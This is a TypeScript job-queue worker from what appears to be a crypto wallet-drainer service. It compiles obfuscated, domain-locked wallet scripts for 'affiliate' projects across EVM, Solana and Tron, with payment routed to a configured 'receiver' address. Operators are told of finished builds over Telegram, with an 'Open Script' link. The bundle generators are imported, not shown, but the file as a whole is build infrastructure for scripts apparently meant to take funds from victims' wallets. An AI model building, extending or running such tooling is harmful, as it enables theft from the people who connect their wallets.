/**
 * Compile worker — consumes compile jobs.
 * aff_* projects: affiliate compile (compileAffiliateProject), publishes .min.js,
 * then sends the completion message with an inline [Open Script] button.
 * "platform" jobs: compile the currently saved dashboard config.
 */
import { Worker } from "bullmq";
import { getRedisConnectionOptions, QUEUE_NAMES } from "../src/lib/queues";
import { compileAffiliateProject } from "../src/lib/affiliate-compile";
import { readCompileConfig } from "../src/lib/compile-config-store";
import { readOperationalConfig } from "../src/lib/operational-config-store";
import { saveScriptBuild } from "../src/lib/script-build-store";
import { generateSolanaBundle, generateTronBundle } from "../src/lib/runtime-bundles";
import { generateSDKBundle } from "../src/lib/sdk-generator";
import { defaultGeneralConfig, defaultWalletConfig, defaultModalConfig, defaultTokensConfig, defaultAdvancedConfig, defaultPayoutConfig, defaultContractsConfig, defaultStrategyConfig, defaultAppKitConfig } from "../src/lib/mock-data";
import { sendTelegramApiMessage } from "../src/lib/queues/telegram";
import type { CompileJobData } from "../src/lib/queues/compile";

function escapeHtml(value: string) {
  return value.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
}

async function compilePlatformBundle() {
  const saved = await readCompileConfig();
  const operational = await readOperationalConfig();
  const merged = {
    general: { ...defaultGeneralConfig, ...saved.general },
    wallet: { ...defaultWalletConfig, ...saved.wallet },
    modal: { ...defaultModalConfig, ...saved.modal },
    tokens: { ...defaultTokensConfig, ...saved.tokens },
    advanced: { ...defaultAdvancedConfig, ...saved.advanced },
    payout: { ...defaultPayoutConfig, ...operational.payout },
    contracts: { ...defaultContractsConfig, ...operational.contracts },
    strategy: { ...defaultStrategyConfig, ...operational.strategy },
    appKit: { ...defaultAppKitConfig, ...operational.appKit },
  };
  const receiver = operational.payout?.address || merged.payout.address || "0x0000000000000000000000000000000000000000";
  let bundle: string;
  if (merged.general.ecosystem === "solana") {
    bundle = generateSolanaBundle({ general: merged.general, wallet: merged.wallet, modal: merged.modal, tokens: merged.tokens, advanced: merged.advanced, receiverAddress: receiver });
  } else if (merged.general.ecosystem === "tron") {
    bundle = generateTronBundle({ general: merged.general, wallet: merged.wallet, modal: merged.modal, tokens: merged.tokens, advanced: merged.advanced, receiverAddress: receiver });
  } else {
    bundle = generateSDKBundle({ general: merged.general, wallet: merged.wallet, modal: { ...merged.modal, exposeExternalSDK: true }, tokens: merged.tokens, advanced: merged.advanced, contracts: merged.contracts, strategy: merged.strategy, appKit: merged.appKit, receiverAddress: receiver });
  }
  const build = await saveScriptBuild({ bundle, framework: merged.modal.modalFrameworkStyle, source: "compile" });
  return { bundle, build, strategy: merged.strategy.mode, backend: merged.strategy.executionBackend, ecosystem: merged.general.ecosystem, modal: merged.modal.modalFrameworkStyle, receiver };
}

async function sendCompletion(chatId: string, text: string, url: string) {
  const replyMarkup = url
    ? { inline_keyboard: [[{ text: "Open Script", url }]] }
    : undefined;
  await sendTelegramApiMessage({ chatId, text, replyMarkup });
}

const worker = new Worker(
  QUEUE_NAMES.compile,
  async (job) => {
    const data = job.data as CompileJobData;
    const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || process.env.NEXT_PUBLIC_APP_URL || "";
    if (data.projectId.startsWith("aff_")) {
      const result = await compileAffiliateProject({
        projectId: data.projectId,
        obfuscationLevel: data.obfuscationLevel ?? "medium",
        publishBuild: true,
      });
      if (data.chatId) {
        const url = result.publishedBuild && baseUrl ? baseUrl + result.publishedBuild.url : "";
        await sendCompletion(
          data.chatId,
          [ "Compile complete", "project: " + result.project.id, "name: " + escapeHtml(result.project.name), "configVersion: " + String(result.configVersion), "domainLock: " + (result.domainLockEnabled ? "enabled" : "disabled"), "size: " + (result.bundle.length / 1024).toFixed(2) + " KB" ].join("\n"),
          url,
        );
      }
      return { projectId: result.project.id, filename: result.filename, sizeKB: Number((result.bundle.length / 1024).toFixed(2)), publishedUrl: result.publishedBuild?.url ?? null };
    }
    const out = await compilePlatformBundle();
    if (data.chatId) {
      const url = out.build && baseUrl ? baseUrl + out.build.url : "";
      await sendCompletion(
        data.chatId,
        [ "St3 Compile complete", "strategy: " + out.strategy + " / backend: " + out.backend, "ecosystem: " + out.ecosystem + " / modal: " + out.modal, "bundle: " + (out.bundle.length / 1024).toFixed(2) + " KB", "receiver: " + out.receiver ].join("\n"),
        url,
      );
    }
    return { platform: true, filename: out.build?.filename ?? null, sizeKB: Number((out.bundle.length / 1024).toFixed(2)), publishedUrl: out.build?.url ?? null };
  },
  { connection: getRedisConnectionOptions(), concurrency: 2 },
);

worker.on("failed", (job, err) => console.error("compile worker job", job?.id, "failed:", err.message));
worker.on("completed", (job) => console.log("compile worker job", job?.id, "completed"));
console.log("[compile.worker] started");
export { worker as compileWorker };
